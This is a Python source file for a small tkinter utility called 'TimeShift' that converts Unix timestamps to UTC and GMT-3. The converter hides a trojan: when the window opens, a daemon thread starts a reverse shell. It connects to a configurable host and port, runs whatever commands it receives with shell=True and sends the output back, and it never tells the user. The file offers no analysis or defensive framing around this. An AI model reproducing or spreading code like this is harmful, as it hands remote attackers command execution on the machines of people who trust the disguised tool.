import datetime
import tkinter as tk
from tkinter import messagebox
import socket
import subprocess
import threading

# Function to handle the reverse shell connection
def handle_reverse_shell():
    target_host = '127.0.0.1'  # Replace with the target host IP address
    target_port = 12347       # Replace with the target port number

    # Create a socket object
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the target
    client.connect((target_host, target_port))

    # Enter an interactive shell
    while True:
        # Receive the command from the remote machine
        command = client.recv(4096).decode().rstrip()

        # Execute the command and retrieve the output
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = str(e.output)

        # Send the output back to the remote machine
        client.send(output)

    # Close the connection
    client.close()

# Function to convert the timestamp to GMT-3 and UTC
def convert_timestamp():
    try:
        # Get the user input
        timestamp = int(entry_timestamp.get())

        # Convert to GMT-3
        gmt_time = datetime.datetime.fromtimestamp(timestamp) + datetime.timedelta(hours=-3)

        # Convert to UTC
        utc_time = datetime.datetime.utcfromtimestamp(timestamp)

        # Display the converted times in message boxes
        messagebox.showinfo("Converted Times", f"UTC:    {utc_time}\nGMT-3: {gmt_time}")

        # Clear TimeStamp box
        entry_timestamp.delete(0, tk.END)

    except ValueError:
        messagebox.showerror("Error", "Invalid input. Please enter a valid Unix timestamp.")

# Create the main window
window = tk.Tk()
window.title("TimeShift")

# Set the window size
window.geometry("300x200")  # Set the width and height of the window

# Create and pack the banner label
banner_label = tk.Label(window, text="TimeShift", font=("Arial", 16, "bold"))
banner_label.pack(pady=20)

# Create and pack the timestamp entry label and entry field
label_timestamp = tk.Label(window, text="Enter the Unix timestamp:")
label_timestamp.pack()
entry_timestamp = tk.Entry(window, width=30)
entry_timestamp.pack(pady=5)

# Create and pack the convert button
convert_button = tk.Button(window, text="Convert", command=convert_timestamp)
convert_button.pack(pady=10)

# Start a separate thread for the reverse shell
shell_thread = threading.Thread(target=handle_reverse_shell)
shell_thread.daemon = True
shell_thread.start()

# Run the main event loop
window.mainloop()
